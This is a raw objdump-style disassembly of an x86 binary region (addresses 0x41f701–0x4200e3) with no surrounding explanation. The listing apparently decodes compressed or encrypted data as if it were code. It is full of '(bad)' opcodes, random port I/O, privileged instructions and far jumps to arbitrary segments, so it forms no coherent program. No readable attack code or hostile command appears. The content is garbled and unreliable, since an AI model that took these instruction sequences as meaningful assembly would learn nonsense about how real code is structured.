  41f701:	and    BYTE PTR [eax+ecx*4+0x40b08930],bh
  41f708:	push   es
  41f709:	in     eax,0x56
  41f70b:	adc    cl,BYTE PTR [ebx-0x615830d2]
  41f711:	aaa    
  41f712:	xor    BYTE PTR [ebx],dl
  41f714:	retf   0xe579
  41f717:	and    edi,DWORD PTR [ebx+0x32]
  41f71a:	bound  eax,QWORD PTR [ebp+0x26]
  41f71d:	das    
  41f71e:	xchg   ebx,eax
  41f71f:	out    dx,al
  41f720:	mov    edx,0x27b28ae0
  41f725:	adc    eax,0xc09c51d5
  41f72a:	loope  0x41f736
  41f72c:	stc    
  41f72d:	outs   dx,BYTE PTR ds:[esi]
  41f72e:	lea    ebp,[ecx-0x644cc78e]
  41f734:	test   edx,esp
  41f736:	and    BYTE PTR [edx-0x5a],ch
  41f739:	push   ss
  41f73a:	mov    cl,0x8c
  41f73c:	in     eax,0xc2
  41f73e:	loop   0x41f7b9
  41f740:	arpl   dx,bx
  41f742:	icebp  
  41f743:	dec    esi
  41f744:	xor    BYTE PTR [edi-0x162e8851],ch
  41f74a:	sbb    DWORD PTR [edi],ebx
  41f74c:	cmp    BYTE PTR [eax+0x66],bl
  41f74f:	arpl   WORD PTR [edx+0x48406dca],bp
  41f755:	dec    edi
  41f756:	or     BYTE PTR [edi],al
  41f758:	imul   ebp,DWORD PTR [edi-0x29],0x29
  41f75c:	pop    ebx
  41f75d:	xchg   edi,eax
  41f75e:	cmp    DWORD PTR [edx-0x259d49a5],ebx
  41f764:	xor    DWORD PTR [edi-0x3b],ebx
  41f767:	mov    ss,WORD PTR [esi]
  41f769:	cli    
  41f76a:	jbe    0x41f756
  41f76c:	inc    edx
  41f76d:	add    DWORD PTR [eax],0x0
	...
  41f7d3:	add    BYTE PTR [eax],al
  41f7d5:	add    BYTE PTR [edx-0x5081dcc4],dl
  41f7db:	jg     0x41f7bc
  41f7dd:	cld    
  41f7de:	call   0x9122:0x866c62d2
  41f7e5:	retf   0x5267
  41f7e8:	add    DWORD PTR [eax],eax
  41f7ea:	add    BYTE PTR [ecx],al
  41f7ec:	add    BYTE PTR [eax],al
  41f7ee:	in     eax,dx
  41f7ef:	mul    dl
  41f7f1:	jns    0x41f7c2
  41f7f3:	(bad)  
  41f7f4:	jmp    0x41f7f6
  41f7f6:	pushf  
  41f7f7:	in     al,0x2a
  41f7f9:	out    dx,eax
  41f7fa:	shl    DWORD PTR [ebp+esi*4+0x2170481e],1
  41f801:	out    0xee,eax
  41f803:	dec    eax
  41f804:	jle    0x41f877
  41f806:	scas   al,BYTE PTR es:[edi]
  41f807:	dec    esp
  41f808:	and    ecx,edx
  41f80a:	or     eax,0x8f90d105
  41f80f:	xchg   edx,eax
  41f810:	call   DWORD PTR [eax-0x499cc65a]
  41f816:	(bad)  
  41f817:	fnstsw WORD PTR [ebx]
  41f819:	xchg   al,ch
  41f81b:	dec    eax
  41f81c:	ss inc eax
  41f81e:	sbb    eax,0x870d5f5
  41f823:	pop    ss
  41f824:	bound  ecx,QWORD PTR [edx]
  41f826:	or     DWORD PTR [ecx+0x33],ebx
  41f829:	imul   BYTE PTR [esi]
  41f82b:	es out dx,eax
  41f82d:	xor    eax,0x85762e4f
  41f832:	mov    esi,0x59412464
  41f837:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f838:	sub    al,0xd
  41f83a:	mov    ecx,0x900bd1a9
  41f83f:	jne    0x41f89e
  41f841:	push   edx
  41f842:	(bad)  
  41f843:	fiadd  DWORD PTR [edi+0x26d32971]
  41f849:	pop    edi
  41f84a:	add    al,0xc5
  41f84c:	jnp    0x41f7e9
  41f84e:	mov    ebp,DWORD PTR [edx-0x3441fbaf]
  41f854:	pop    edi
  41f855:	das    
  41f856:	xchg   esi,eax
  41f857:	and    al,0xb8
  41f859:	adc    eax,0xdf0778cd
  41f85e:	mov    dh,0x41
  41f860:	or     al,0xe
  41f862:	and    BYTE PTR [ecx+0x4ad03494],dh
  41f868:	xchg   eax,edx
  41f86a:	sbb    eax,esp
  41f86c:	(bad)  [ebx-0x1d146a14]
  41f872:	mov    ecx,0xc8c0bb4e
  41f877:	mov    al,0xe9
  41f879:	ss push 0x8237603d
  41f87f:	loopne 0x41f816
  41f881:	cmp    bh,al
  41f883:	inc    eax
  41f884:	jmp    0x9ac8:0x53541fa
  41f88b:	xchg   edi,eax
  41f88c:	push   0xe2f08300
  41f891:	hlt    
  41f892:	dec    edi
  41f893:	xor    al,0x65
  41f895:	cmp    ecx,esi
  41f897:	imul   ebp,DWORD PTR [edi-0x4a],0xffffff91
  41f89b:	pop    es
  41f89c:	pop    ebx
  41f89d:	cmp    eax,DWORD PTR [esi+edx*1]
  41f8a0:	test   eax,0x92cbd6f1
  41f8a5:	mov    ch,0x95
  41f8a7:	xor    eax,0x8b2d21ba
  41f8ac:	cmp    dh,BYTE PTR [ebp+0x57105947]
  41f8b2:	and    bh,BYTE PTR [edi+0x44]
  41f8b5:	(bad)  
  41f8b6:	push   eax
  41f8b7:	xor    DWORD PTR [ebx-0x4f],ecx
  41f8ba:	jnp    0x41f878
  41f8bc:	jge    0x41f874
  41f8be:	and    DWORD PTR [ebx],eax
  41f8c0:	call   0xfe3a:0xd35b3e8d
  41f8c7:	popf   
  41f8c8:	aam    0xb3
  41f8ca:	push   es
  41f8cb:	stos   DWORD PTR es:[edi],eax
  41f8cc:	lods   eax,DWORD PTR ds:[esi]
  41f8cd:	pusha  
  41f8ce:	push   eax
  41f8cf:	add    esp,eax
  41f8d1:	rcr    bl,cl
  41f8d3:	sub    ch,BYTE PTR [ebp-0x38b2a91a]
  41f8d9:	mov    esi,0x69ab3cb1
  41f8de:	das    
  41f8df:	dec    edi
  41f8e0:	ret    
  41f8e1:	sbb    ch,0x70
  41f8e4:	popa   
  41f8e5:	xor    dl,cl
  41f8e7:	jmp    DWORD PTR [esp+esi*4-0x52f735c9]
	...
  41f956:	mov    eax,ds:0x3b920b9a
  41f95b:	xchg   ebx,eax
  41f95c:	mov    ecx,0x4183febb
  41f961:	pop    edx
  41f962:	inc    esi
  41f963:	(bad)  
  41f965:	push   esp
  41f966:	addr16 push ebx
  41f968:	add    DWORD PTR [eax],eax
  41f96a:	add    BYTE PTR [ecx],al
  41f96c:	add    BYTE PTR [eax],al
  41f96e:	out    dx,eax
  41f96f:	sub    DWORD PTR [edi-0x31],esp
  41f972:	jmp    0xe161d243
  41f977:	rcl    BYTE PTR [edi+ebp*4],0x39
  41f97b:	xor    al,0xec
  41f97d:	jg     0x41f966
  41f97f:	sub    eax,0x984451c2
  41f984:	mov    cl,0x3a
  41f986:	jno    0x41f9cb
  41f988:	mov    ds:0xcf3fbe32,eax
  41f98d:	sti    
  41f98e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f98f:	das    
  41f990:	or     bl,0xcd
  41f993:	cwde   
  41f994:	sbb    bh,al
  41f996:	push   esi
  41f997:	(bad)  
  41f999:	jecxz  0x41f9a6
  41f99b:	inc    esi
  41f99c:	inc    ebx
  41f99d:	pusha  
  41f99e:	pop    edi
  41f99f:	clc    
  41f9a0:	jno    0x41f94e
  41f9a2:	test   al,0xc
  41f9a4:	psubsb mm5,QWORD PTR [eax-0x2]
  41f9a8:	shr    esi,0x1a
  41f9ab:	adc    eax,0xe34a4718
  41f9b0:	push   ebp
  41f9b1:	xchg   DWORD PTR [esi-0x42bd0d94],eax
  41f9b7:	mov    ebx,0x5a5a53cf
  41f9bc:	sub    eax,0xaa59cbaf
  41f9c1:	sbb    DWORD PTR [ecx],edx
  41f9c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9c4:	rcl    BYTE PTR [eax],1
  41f9c6:	arpl   WORD PTR [edi-0x2469e41f],bp
  41f9cc:	test   eax,0xd35d5796
  41f9d1:	popf   
  41f9d2:	js     0x41f957
  41f9d4:	fs scas eax,DWORD PTR es:[edi]
  41f9d6:	adc    BYTE PTR [edi-0x6bd4770e],bh
  41f9dc:	inc    ebp
  41f9dd:	ins    BYTE PTR es:[edi],dx
  41f9de:	(bad)  [edi]
  41f9e0:	sbb    DWORD PTR [edx],ebx
  41f9e2:	push   0xffffffe2
  41f9e4:	and    eax,0x728d284a
  41f9e9:	mov    ch,0xf0
  41f9eb:	pop    DWORD PTR ds:0x8a574c8a
  41f9f1:	xchg   edi,eax
  41f9f2:	adc    eax,0xbfa6ed26
  41f9f7:	sahf   
  41f9f8:	inc    edx
  41f9f9:	cmp    al,0xd7
  41f9fb:	ss sbb dl,dh
  41f9fe:	mov    esp,0x98e78f88
  41fa03:	add    al,0xf8
  41fa05:	or     al,0x42
  41fa07:	repnz xor dl,BYTE PTR [edx]
  41fa0a:	xor    BYTE PTR [ecx+eax*1-0x60f0883e],bh
  41fa11:	push   ebx
  41fa12:	pop    ebx
  41fa13:	in     eax,dx
  41fa14:	lea    edi,[ecx]
  41fa16:	xor    eax,0xdf86b55a
  41fa1b:	mov    ds:0xaf1057e0,eax
  41fa20:	cmp    BYTE PTR [edi-0x5a],al
  41fa23:	jnp    0x41fa02
  41fa25:	jle    0x41fa98
  41fa27:	add    al,0x9f
  41fa29:	xchg   esi,eax
  41fa2a:	iret   
  41fa2b:	popa   
  41fa2c:	cmp    al,0x63
  41fa2e:	xor    ebp,DWORD PTR [ecx-0xe9382b1]
  41fa34:	mov    bl,0x3f
  41fa36:	xor    DWORD PTR [edx-0x63cfa1a2],0x49360960
  41fa40:	bnd jae 0x41fa03
  41fa43:	out    0x70,eax
  41fa45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa47:	dec    edi
  41fa48:	dec    ebx
  41fa49:	stos   DWORD PTR es:[edi],eax
  41fa4a:	inc    ecx
  41fa4b:	sub    DWORD PTR [eax+0x74af4a75],ecx
  41fa51:	cdq    
  41fa52:	push   ecx
  41fa53:	leave  
  41fa54:	xchg   ebx,eax
  41fa55:	dec    DWORD PTR gs:[esi+0x5d752662]
  41fa5c:	jo     0x41f9ee
  41fa5e:	fmul   QWORD PTR [edi+0x5585576c]
  41fa64:	jecxz  0x41fa8b
  41fa66:	iret   
  41fa67:	inc    edi
  41fa68:	fadd   st(6),st
  41fa6a:	out    dx,eax
  41fa6b:	mov    ch,0xfa
  41fa6d:	dec    edx
	...
  41fad6:	or     al,BYTE PTR [ecx-0x49]
  41fad9:	mov    eax,ds:0xeb1ef7ff
  41fade:	and    edx,DWORD PTR [edi-0x5d]
  41fae1:	adc    eax,0x6b78d3e6
  41fae6:	addr16 push esp
  41fae8:	add    DWORD PTR [eax],eax
  41faea:	add    BYTE PTR [ecx],al
  41faec:	add    BYTE PTR [eax],al
  41faee:	cwde   
  41faef:	adc    ecx,ecx
  41faf1:	(bad)  [ebx+esi*8+0x43]
  41faf5:	and    eax,0xcdfa096
  41fafa:	mov    cl,0x3d
  41fafc:	xor    esp,DWORD PTR [eax-0x58b3233b]
  41fb02:	dec    esp
  41fb03:	mov    cl,0xbd
  41fb05:	cmp    ecx,DWORD PTR [ecx+0x288a87f5]
  41fb0b:	dec    ebp
  41fb0c:	xchg   edx,eax
  41fb0d:	mov    esp,0xfd79950f
  41fb12:	ins    BYTE PTR es:[edi],dx
  41fb13:	sub    al,BYTE PTR [eax*2-0x3c7489f8]
  41fb1a:	or     BYTE PTR [ebx],0x56
  41fb1d:	mov    cl,0x31
  41fb1f:	sahf   
  41fb20:	(bad)
  41fb25:	xlat   BYTE PTR ds:[ebx]
  41fb26:	mov    ch,0x27
  41fb28:	lock jge 0x41fb1c
  41fb2b:	fwait
  41fb2c:	pop    ebx
  41fb2d:	int    0xfd
  41fb2f:	stos   DWORD PTR es:[edi],eax
  41fb30:	les    ebx,FWORD PTR [edx+0x58]
  41fb33:	repnz mov ch,0xcf
  41fb36:	outs   dx,BYTE PTR ds:[esi]
  41fb37:	jp     0x41fb93
  41fb39:	jo     0x41fb58
  41fb3b:	jle    0x41fad2
  41fb3d:	pop    edx
  41fb3e:	pushf  
  41fb3f:	xor    al,0xf3
  41fb41:	(bad)  
  41fb42:	div    BYTE PTR [ecx+0x43d0008]
  41fb48:	mov    esi,0x391554d2
  41fb4d:	sbb    al,0x78
  41fb4f:	jmp    0x80f9986d
  41fb54:	inc    esp
  41fb55:	add    edx,esi
  41fb57:	and    cl,ah
  41fb59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb5a:	push   ds
  41fb5b:	mov    ecx,0xbe8ddb14
  41fb60:	clc    
  41fb61:	add    dh,0x14
  41fb64:	xor    al,0x31
  41fb66:	pop    edi
  41fb67:	sti    
  41fb68:	jb     0x41fb31
  41fb6a:	xor    edi,0x2e
  41fb6d:	inc    esi
  41fb6e:	and    eax,0xb2e5f96f
  41fb73:	in     al,dx
  41fb74:	std    
  41fb75:	rol    BYTE PTR [ebp+0xf4526b6],0xf
  41fb7c:	mov    DWORD PTR [ebx+0x41],edx
  41fb7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb80:	ins    DWORD PTR es:[edi],dx
  41fb81:	add    BYTE PTR [edi],dl
  41fb83:	adc    dl,BYTE PTR [ebx]
  41fb85:	adc    BYTE PTR [edi-0x1d2a121c],0xd3
  41fb8c:	bound  ebx,QWORD PTR [edi]
  41fb8e:	repz dec ebp
  41fb90:	fstp   DWORD PTR [eax]
  41fb92:	mov    cl,0x19
  41fb94:	xchg   ebp,eax
  41fb95:	sub    bl,BYTE PTR [ebx-0x5b]
  41fb98:	push   cs
  41fb99:	and    BYTE PTR [ebx-0x35],ch
  41fb9c:	sets   BYTE PTR [ebp-0x75a3f821]
  41fba3:	hlt    
  41fba4:	mov    al,0xe
  41fba6:	daa    
  41fba7:	add    BYTE PTR [edx],0xa
  41fbaa:	adc    eax,esp
  41fbac:	inc    eax
  41fbad:	push   ss
  41fbae:	sbb    al,0xa1
  41fbb0:	pop    es
  41fbb1:	sbb    cl,BYTE PTR [ecx-0x31a0dad2]
  41fbb7:	sub    al,0xc9
  41fbb9:	inc    ebp
  41fbba:	pop    eax
  41fbbb:	shl    DWORD PTR [edx+0x16],0x3
  41fbbf:	les    ebp,FWORD PTR [ebp+0x2c]
  41fbc2:	pusha  
  41fbc3:	leave  
  41fbc4:	mov    BYTE PTR [edi-0x6948d6f6],ah
  41fbca:	jne    0x41fbff
  41fbcc:	rcr    BYTE PTR [esi+0xf20a29f],1
  41fbd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbd3:	ds mov cl,0xcc
  41fbd6:	add    al,0xeb
  41fbd8:	imul   ecx,ebp,0xfffffff9
  41fbdb:	shl    BYTE PTR [eax],0x28
  41fbde:	xchg   edx,eax
  41fbdf:	frstor [esi-0x6f]
  41fbe2:	adc    DWORD PTR [esi],0x57cd74a7
  41fbe8:	clc    
  41fbe9:	xchg   DWORD PTR [esp+eiz*4+0x778f],ebx
	...
  41fc54:	add    BYTE PTR [eax],al
  41fc56:	fsubr  QWORD PTR [eax]
  41fc58:	mov    ah,ah
  41fc5a:	(bad)  
  41fc5b:	out    0xfe,al
  41fc5d:	cmp    BYTE PTR [esi],ah
  41fc5f:	ret    
  41fc60:	or     DWORD PTR [esi],edx
  41fc62:	mov    bh,0x8a
  41fc64:	daa    
  41fc65:	repz addr16 push ebp
  41fc68:	add    DWORD PTR [eax],eax
  41fc6a:	add    BYTE PTR [ecx],al
  41fc6c:	add    BYTE PTR [eax],al
  41fc6e:	outs   dx,BYTE PTR ds:[esi]
  41fc6f:	fdivr  QWORD PTR [ebx]
  41fc71:	loope  0x41fc6a
  41fc73:	adc    BYTE PTR [ebx],dl
  41fc75:	scas   al,BYTE PTR es:[edi]
  41fc76:	ja     0x41fc98
  41fc78:	test   eax,0x68ee48c0
  41fc7d:	test   DWORD PTR [edi-0x5],esi
  41fc80:	pop    ds
  41fc81:	jg     0x41fc9f
  41fc83:	arpl   WORD PTR [ebp+edx*8-0x66],sp
  41fc87:	cmp    al,0x43
  41fc89:	lahf   
  41fc8a:	shl    DWORD PTR [ebx+0x63f1a69b],1
  41fc90:	fistp  DWORD PTR [ebp+edi*2-0x13]
  41fc94:	vmovhpd xmm1,xmm0,QWORD PTR [ebp-0x1cbde444]
  41fc9c:	ds in  al,dx
  41fc9e:	push   esi
  41fc9f:	(bad)  
  41fca0:	pop    ebp
  41fca1:	push   0xc30627e7
  41fca6:	or     eax,0x6cd871e5
  41fcab:	out    0x8d,al
  41fcad:	mov    eax,0xc12c5b5a
  41fcb2:	jmp    0xd4c4832
  41fcb7:	add    DWORD PTR [ebp-0x79],0x13
  41fcbb:	ror    DWORD PTR ds:0x5e0b8b40,cl
  41fcc1:	repnz pushf 
  41fcc3:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41fcc5:	jle    0x41fcbe
  41fcc7:	outs   dx,BYTE PTR ds:[esi]
  41fcc8:	jmp    0x41fcdf
  41fcca:	inc    edx
  41fccb:	popa   
  41fccc:	pusha  
  41fccd:	add    al,0x2e
  41fccf:	retf   0x90c4
  41fcd2:	call   0x63936d75
  41fcd7:	or     DWORD PTR [ebx],edx
  41fcd9:	sti    
  41fcda:	jbe    0x41fcee
  41fcdc:	jl     0x41fcd1
  41fcde:	push   eax
  41fcdf:	out    0x8b,eax
  41fce1:	mov    al,dl
  41fce3:	mov    cl,0x97
  41fce5:	gs ins BYTE PTR es:[edi],dx
  41fce7:	pop    ss
  41fce8:	into   
  41fce9:	push   ebp
  41fcea:	fcomp  QWORD PTR [ebx+0x1be32b6d]
  41fcf0:	push   es
  41fcf1:	int    0x3f
  41fcf3:	or     BYTE PTR [edi],bh
  41fcf5:	jge    0x41fc8f
  41fcf7:	sub    ch,cl
  41fcf9:	pop    ebx
  41fcfa:	push   ebx
  41fcfb:	pop    ds
  41fcfc:	dec    edx
  41fcfd:	leave  
  41fcfe:	and    al,0x44
  41fd00:	inc    esi
  41fd01:	lods   al,BYTE PTR ds:[esi]
  41fd02:	push   ebp
  41fd03:	pop    ebp
  41fd04:	mov    edi,0x3198de34
  41fd09:	ja     0x41fccd
  41fd0b:	xchg   esp,eax
  41fd0c:	adc    ah,BYTE PTR [edx-0x4c]
  41fd0f:	jmp    0xfe5c76f8
  41fd14:	xchg   edi,eax
  41fd15:	inc    edx
  41fd16:	inc    ebp
  41fd17:	mov    edx,DWORD PTR ds:0x8003ff5c
  41fd1d:	jge    0x41fd08
  41fd1f:	adc    al,0x4b
  41fd21:	push   eax
  41fd22:	xor    ebx,DWORD PTR [ecx-0x1d4c89eb]
  41fd28:	jno    0x41fd98
  41fd2a:	test   al,0x82
  41fd2c:	sbb    al,0xdc
  41fd2e:	xchg   BYTE PTR [esi-0x64],cl
  41fd31:	and    DWORD PTR [edx],0xffffffdf
  41fd34:	mov    ch,al
  41fd36:	test   esi,esi
  41fd38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd39:	and    al,BYTE PTR [ecx-0x43]
  41fd3c:	cld    
  41fd3d:	(bad)  
  41fd3e:	hlt    
  41fd3f:	cdq    
  41fd40:	push   edx
  41fd41:	stos   BYTE PTR es:[edi],al
  41fd42:	ret    
  41fd43:	mov    ch,0x92
  41fd45:	xor    esi,DWORD PTR [edx-0x26892ca2]
  41fd4b:	cmc    
  41fd4c:	and    dh,BYTE PTR [esi+0x24]
  41fd4f:	inc    ecx
  41fd50:	ret    
  41fd51:	jle    0x41fd03
  41fd53:	dec    eax
  41fd54:	cld    
  41fd55:	sti    
  41fd56:	cli    
  41fd57:	adc    al,0x6c
  41fd59:	aad    0xc0
  41fd5b:	outs   dx,BYTE PTR ds:[esi]
  41fd5c:	clc    
  41fd5d:	aam    0xa4
  41fd5f:	mov    cl,0x4a
  41fd61:	mov    esi,0x8c297b68
  41fd66:	mov    ch,0x2
  41fd68:	stos   BYTE PTR es:[edi],al
  41fd69:	shl    edx,cl
  41fd6b:	sbb    dl,dh
  41fd6d:	std    
	...
  41fdd6:	or     al,0x6a
  41fdd8:	push   edx
  41fdd9:	shl    DWORD PTR [esi-0x7],0x9f
  41fddd:	out    dx,eax
  41fdde:	pop    ds
  41fddf:	pop    edx
  41fde0:	pushf  
  41fde1:	push   ss
  41fde2:	add    BYTE PTR [ebx],0xb8
  41fde5:	and    esp,DWORD PTR [edi+0x56]
  41fde8:	add    DWORD PTR [eax],eax
  41fdea:	add    BYTE PTR [ecx],al
  41fdec:	add    BYTE PTR [eax],al
  41fdee:	mov    dl,0xfe
  41fdf0:	pop    ds
  41fdf1:	fsubp  st(4),st
  41fdf3:	inc    edi
  41fdf4:	fcomip st,st(6)
  41fdf6:	std    
  41fdf7:	xchg   esi,eax
  41fdf8:	in     al,dx
  41fdf9:	imul   ebx,DWORD PTR [ebx+edx*2+0x64],0x2e7ea52d
  41fe01:	jecxz  0x41fdc2
  41fe03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe04:	inc    esi
  41fe05:	mov    ds:0xbec54211,al
  41fe0a:	sub    dl,0x65
  41fe0d:	jb     0x41fe2d
  41fe0f:	ins    DWORD PTR es:[edi],dx
  41fe10:	daa    
  41fe11:	inc    esp
  41fe12:	and    DWORD PTR [eax+0x10e96ece],eax
  41fe18:	and    BYTE PTR [ebp-0x745fdda9],al
  41fe1e:	into   
  41fe1f:	adc    DWORD PTR [eax],edi
  41fe21:	xchg   DWORD PTR [edi+0x6111895b],edx
  41fe27:	mov    ecx,0x65733ad5
  41fe2c:	stc    
  41fe2d:	mov    dh,0x5d
  41fe2f:	mov    eax,ds:0xdef60c7
  41fe34:	xor    BYTE PTR [esi-0x43],bl
  41fe37:	jbe    0x41fdbb
  41fe39:	jno    0x41fe40
  41fe3b:	push   ds
  41fe3c:	mov    ah,0x54
  41fe3e:	push   esp
  41fe3f:	inc    ecx
  41fe40:	clc    
  41fe41:	cmp    eax,0x53a1baa3
  41fe46:	cmp    BYTE PTR [esi-0x3d],cl
  41fe49:	(bad)  
  41fe4a:	pop    edi
  41fe4b:	cld    
  41fe4c:	dec    ecx
  41fe4d:	push   0xfffffff3
  41fe4f:	lds    edx,FWORD PTR [ecx-0x379137f5]
  41fe55:	cmp    al,0x5c
  41fe57:	fmul   QWORD PTR [ebx+0x5863596d]
  41fe5d:	mov    ecx,0xe33c7704
  41fe62:	imul   esp,DWORD PTR [esi-0x5],0x4d
  41fe66:	adc    eax,0xa3ca4c60
  41fe6b:	mov    DWORD PTR [edx-0x4b],eax
  41fe6e:	mov    ds:0xce430d82,eax
  41fe73:	xchg   esi,eax
  41fe74:	jmp    0xf65b4af0
  41fe79:	mov    edx,DWORD PTR [esi-0x3c]
  41fe7c:	sub    BYTE PTR [ebp-0x6b],ch
  41fe7f:	lds    ecx,FWORD PTR [eax]
  41fe81:	loopne 0x41fef3
  41fe83:	jg     0x41fe89
  41fe85:	test   DWORD PTR [edi],edx
  41fe87:	pop    ecx
  41fe88:	xlat   BYTE PTR ds:[ebx]
  41fe89:	leave  
  41fe8a:	fadd   st(0),st
  41fe8c:	xor    ecx,DWORD PTR [edx]
  41fe8e:	or     al,0x9
  41fe90:	and    al,0xd9
  41fe92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe93:	mov    eax,ds:0x32ec32bd
  41fe98:	das    
  41fe99:	call   0x85d9:0x7aac1269
  41fea0:	pop    ebx
  41fea1:	pop    edx
  41fea2:	out    0x39,eax
  41fea4:	inc    esi
  41fea5:	pop    ecx
  41fea6:	xchg   DWORD PTR [esi+0x7],esi
  41fea9:	inc    edi
  41feaa:	je     0x41fed9
  41feac:	pop    ds
  41fead:	mov    eax,esp
  41feaf:	out    0xfc,al
  41feb1:	pop    esi
  41feb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41feb3:	xchg   edi,eax
  41feb4:	pop    edx
  41feb5:	mov    esp,0xdccd81fe
  41feba:	add    eax,0xf77adf7c
  41febf:	jmp    0x1849a100
  41fec4:	xchg   ecx,eax
  41fec5:	mov    ?,WORD PTR [ebx+edx*2]
  41fec8:	(bad)  
  41fec9:	lods   al,BYTE PTR ds:[esi]
  41feca:	mov    edi,0xe28944c1
  41fecf:	fwait
  41fed0:	jae    0x41feb0
  41fed2:	cmc    
  41fed3:	inc    esp
  41fed4:	fisub  WORD PTR [edi-0x5669cf2c]
  41feda:	mov    gs,WORD PTR [ebp+0x3a]
  41fedd:	and    al,0xe2
  41fedf:	pushf  
  41fee0:	add    BYTE PTR [edx+0x10],dl
  41fee3:	es sbb bh,al
  41fee6:	sbb    BYTE PTR [ebx],bl
  41fee8:	dec    esi
  41fee9:	cmp    DWORD PTR [esi+0x6],ebp
  41feec:	sbb    dl,BYTE PTR [ebp+0x0]
	...
  41ff56:	stos   BYTE PTR es:[edi],al
  41ff57:	push   ebp
  41ff58:	call   0xfb5d:0xffefffe7
  41ff5f:	(bad)  
  41ff60:	hlt    
  41ff61:	mov    ah,0xd4
  41ff63:	dec    ebx
  41ff64:	xor    esi,0x67
  41ff67:	push   edi
  41ff68:	add    DWORD PTR [eax],eax
  41ff6a:	add    BYTE PTR [ecx],al
  41ff6c:	add    BYTE PTR [eax],al
  41ff6e:	push   esp
  41ff6f:	repz lea esi,[edx-0x24]
  41ff73:	div    BYTE PTR [ecx-0x68]
  41ff76:	inc    esi
  41ff77:	(bad)  
  41ff78:	sbb    esi,esi
  41ff7a:	or     BYTE PTR [edx+0x33],al
  41ff7d:	and    DWORD PTR [ecx+eax*8],ebx
  41ff80:	jns    0x41ffb9
  41ff82:	fdiv   QWORD PTR [edi-0x407da56f]
  41ff88:	sbb    al,0x68
  41ff8a:	xchg   esp,eax
  41ff8b:	xchg   edi,eax
  41ff8c:	xchg   esi,eax
  41ff8d:	xchg   esp,eax
  41ff8e:	cmp    eax,0x7edfabf5
  41ff93:	cmc    
  41ff94:	dec    edi
  41ff95:	sub    DWORD PTR [edx+edi*8-0x50fad2ce],esi
  41ff9c:	scas   eax,DWORD PTR es:[edi]
  41ff9d:	shl    BYTE PTR [esi],1
  41ff9f:	jge    0x41ff52
  41ffa1:	xor    al,0x2d
  41ffa3:	push   edx
  41ffa4:	sub    edx,0x5f106ab8
  41ffaa:	pushf  
  41ffab:	and    esi,DWORD PTR [ecx+0x74]
  41ffae:	(bad)  
  41ffaf:	add    al,0xf3
  41ffb1:	dec    esi
  41ffb2:	fldenv [edx-0x712f6b05]
  41ffb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffb9:	call   0xf0cbd122
  41ffbe:	jns    0x420008
  41ffc0:	add    BYTE PTR [edx-0x3f81851e],cl
  41ffc6:	mov    DWORD PTR [ecx],esi
  41ffc8:	iret   
  41ffc9:	pop    edx
  41ffca:	cmc    
  41ffcb:	or     al,0xd8
  41ffcd:	mov    esi,0x6e0d995c
  41ffd2:	add    ebx,DWORD PTR [eax+0x54]
  41ffd5:	add    DWORD PTR [ebx+0x3],edx
  41ffd8:	dec    esi
  41ffd9:	mov    dl,0x8d
  41ffdb:	push   ebp
  41ffdc:	push   0x63
  41ffde:	xlat   BYTE PTR ds:[ebx]
  41ffdf:	in     al,0x59
  41ffe1:	mov    dh,0xc5
  41ffe3:	inc    esi
  41ffe4:	xchg   ebx,eax
  41ffe5:	aam    0xcc
  41ffe7:	xchg   esp,eax
  41ffe8:	cmc    
  41ffe9:	or     DWORD PTR [ecx+edi*2],esp
  41ffec:	push   0x4e
  41ffee:	pop    ecx
  41ffef:	sub    DWORD PTR [ecx+0x6cc0eb0e],ecx
  41fff5:	pop    ecx
  41fff6:	xor    BYTE PTR [ebx+0x35],0x6a
  41fffa:	add    dl,BYTE PTR [ecx+0x45fc1d11]
  420000:	push   eax
  420001:	dec    esi
  420002:	and    BYTE PTR [edx],dh
  420004:	xor    al,cl
  420006:	adc    al,0x30
  420008:	xchg   ecx,eax
  420009:	jl     0x41fff0
  42000b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42000c:	add    dl,BYTE PTR [edx-0x3f]
  42000f:	mov    edi,0xe3f3e02a
  420014:	jg     0x41fff6
  420016:	das    
  420017:	scas   al,BYTE PTR es:[edi]
  420018:	retf   
  420019:	addr16 test eax,0x1ddf0ef6
  42001f:	pop    es
  420020:	jo     0x420021
  420022:	pop    esp
  420023:	or     ch,dl
  420025:	mov    edi,esi
  420027:	push   ss
  420028:	inc    edi
  420029:	sub    eax,0x8cc30b96
  42002e:	push   esp
  42002f:	pushf  
  420030:	push   ebx
  420031:	out    dx,eax
  420032:	cmp    DWORD PTR [ebx],eax
  420034:	fidiv  DWORD PTR [edx]
  420036:	sbb    eax,0x8d7f3312
  42003b:	fbstp  TBYTE PTR [edx+0x4d]
  42003e:	stos   BYTE PTR es:[edi],al
  42003f:	int3   
  420040:	adc    BYTE PTR [edx+0x23ba68e],bl
  420046:	or     eax,0xd3209388
  42004b:	or     ebp,edx
  42004d:	mov    BYTE PTR [ebx+0x1],ah
  420050:	mul    DWORD PTR [eax]
  420052:	xchg   esp,eax
  420053:	scas   al,BYTE PTR es:[edi]
  420054:	lods   eax,DWORD PTR ds:[esi]
  420055:	xor    ecx,esp
  420057:	les    esi,FWORD PTR [ecx]
  420059:	xor    bl,BYTE PTR [ebx-0x2e59f55f]
  42005f:	shl    dh,1
  420061:	dec    esi
  420062:	pop    ecx
  420063:	cmp    eax,0x18b034f8
  420068:	mov    al,0x62
  42006a:	leave  
  42006b:	and    eax,DWORD PTR [eax]
  42006d:	rol    DWORD PTR [eax],0x0
	...
  4200d4:	add    BYTE PTR [eax],al
  4200d6:	bound  esp,QWORD PTR [ebp-0x8808a]
  4200dc:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0x7a
  4200e3:	loope  0x42007a
